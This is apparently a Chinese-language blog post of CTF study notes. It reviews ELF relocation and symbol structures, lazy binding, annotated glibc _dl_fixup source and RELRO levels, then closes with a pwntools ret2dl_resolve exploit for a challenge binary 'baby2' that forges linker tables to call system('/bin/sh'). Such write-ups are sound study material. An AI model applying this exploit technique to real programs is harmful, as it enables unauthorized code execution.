---
title: Relro_Review
date: 2019-03-27 16:25:51
tags:
layout: post
---
长久没做.忘完了..复习一下...
<!--more-->
# Outset
周末的时候忙里偷闲做了一下2k19的一个比赛里面有binary的都比较简单..没binary的比较懒没去看..但是有道题做不出来...baby2.
比完之后看了wp发现使用`_dl_runtime_resolve`之前有做过当时搞懂了但是复现的时候发现自己一脑茫然...还是重学一遍...长久不用就忘记了.

[winesap_社课][1]比较长比较详细...没时间的我打算自己通过源码复习...

# Struct
`https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/elf.h`

主要涉及两个结构体
这里摘录一下
## 32
#Elf32_Rel size=0x8
```c
typedef struct elf32_rel {
  Elf32_Addr	r_offset;//got
  Elf32_Word	r_info;//idx
} Elf32_Rel;
```
#Elf32_Rela size=0xc
```c
typedef struct elf32_rela{
  Elf32_Addr	r_offset;//got
  Elf32_Word	r_info;//idx
  Elf32_Sword	r_addend;
} Elf32_Rela;
```
#Elf32_Sym size=0x18
```c
typedef struct elf32_sym{
  Elf32_Word	st_name;//offset
  Elf32_Addr	st_value;
  Elf32_Word	st_size;
  unsigned char	st_info;
  unsigned char	st_other;
  Elf32_Half	st_shndx;
} Elf32_Sym;
```
## 64
#Elf64_Rel size=0x10
```c
typedef struct elf64_rel {
  Elf64_Addr r_offset;	/* Location at which to apply the action */
  Elf64_Xword r_info;	/* index and type of relocation */
} Elf64_Rel;
```
#Elf64_Rela size=0x18
```c
typedef struct elf64_rela {
  Elf64_Addr r_offset;	/* Location at which to apply the action */
  Elf64_Xword r_info;	/* index and type of relocation */
  Elf64_Sxword r_addend;	/* Constant addend used to compute value */
} Elf64_Rela;
```
#Elf64_Sym size=0x30
```c
typedef struct elf64_sym {
  Elf64_Word st_name;		/* Symbol name, index in string tbl */
  unsigned char	st_info;	/* Type and binding attributes */
  unsigned char	st_other;	/* No defined meaning, 0 */
  Elf64_Half st_shndx;		/* Associated section index */
  Elf64_Addr st_value;		/* Value of the symbol */
  Elf64_Xword st_size;		/* Associated symbol size */
} Elf64_Sym;
```
# Lazy_Binding
```s
Call FuncA.plt
    |
    v
Jump [FuncA.GOT]
    |
    V
push idx;jump Plt0
    |
    V
push link_map;jump _dl_runtime_resolve
    |
    V
call _dl_fixup
    |
    V
call _dl_lookup_symbol_x
```
主要实现由idx到真实地址的转换的函数是_dl_fixup()
# _dl_fixup
`https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#59`

talk is cheap 我们先来看`_dl_fixup`的源码
(以下纯属自己分析...如有谬误请一定指正,不胜感激)
```c
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
           ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
           struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
    //获得STMTAB地址

  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
    //获得STRTAB地址

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    //获得Elf_rel地址

  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
    //获得ELF_sym地址
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
    //获得GOT结构体地址
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
    //某些检查
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;
      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        {
          const ElfW(Half) *vernum =
            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
      /* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
        {
          THREAD_GSCOPE_SET_FLAG ();
          flags |= DL_LOOKUP_GSCOPE_LOCK;
        }
#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif
    //下面部分通过在libc中search "string" 获得real_address
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
        THREAD_GSCOPE_RESET_FLAG ();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif
      /* Currently result contains the base load address (or link map)
         of the object that defines sym.  Now add in the symbol
         offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
                                   SYMBOL_ADDRESS (result, sym, false));
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
         address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
    }
  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);
  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;
  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```
整个函数简略的流程:
```s
1.获得DynStr,DynSym,DynRel地址
2.传入的rel_arg 在Rel 中找到Elf_Rel结构体
3.通过Elf_Rel得到got地址和Elf_Sym的地址
4.通过Elf_Sym获得Str表的offset从而获得String
5.通过_dl_lookup_symbol_x得到真实地址
```


# Relro

relro 是一种用于加强对 binary 数据段的保护的技术。relro 保护分为 partial relro 和 full relro.gcc的默认是开partial.[这篇论文][2]中涉及了对3种程度保护(加上无保护)的理论上的攻击方法.

没有仔细去阅读源码只有经验上的认识
```python
No Relro: DnyStr,DnySym 是可以写的
Partial Reloro: 不可以写上述表但是可以通过伪造Idx攻击
Full Relro: Got不可改写
```

# Partial

[binary][3]

过程比较简单不作说明

感觉平时用的少了导致我一直没想到用这个方法...
往pwnable.tw gets 那题的方法走了...走歪了
DL_resolver 适用于没有泄露时.

# exp
```python
from pwn import *
#context.log_level='debug'
got=0x804a00c
read=0x8048330
rbp=0x0804850b
ppp=0x08048509
ret=0x080482fa
bss=0x0804a800
tmp=0xf75d8000+0x3ac62
plt0=0x8048320
strtab=0x8048240
dynsym=0x80481d0
dynrel=0x80482d8
p2=flat(
[got,0x07+(((bss+0x10-dynsym)/0x10)<<8)],0xdeadbeef,0xdeadbeef,# DYN_REL & ALAIGN
[bss+0x28-strtab,0x12,0,0,0,0],#DYNSYM
)+"system\x00\x00"+"/bin/sh\x00"#DYNSTR
context.arch='i386'
while(1):
	p=process("./baby2")
	#gdb.attach(p,'b *0x80484ae')
	payload=p32(ret)*2+p32(read)+p32(ppp)+p32(0)+p32(bss)+p32(0x123)+p32(plt0)+p32((bss-dynrel))+p32(bss+0x30)*2
	payload=payload.ljust(0x2c,'\x00')
	payload+='\x00'
	p.send(payload)
	sleep(0.3)
	#raw_input()
	try:
		p.send(p2)
		p.interactive()
	except Exception:
		p.close()
```
-




[1]: https://www.youtube.com/watch?v=wsIvqd9YqTI
[2]: https://github.com/n132/banana/blob/master/Pwn/papers/dl_resolver.pdf
[3]: https://github.com/n132/Watermalon/blob/master/2k19/baby2/baby2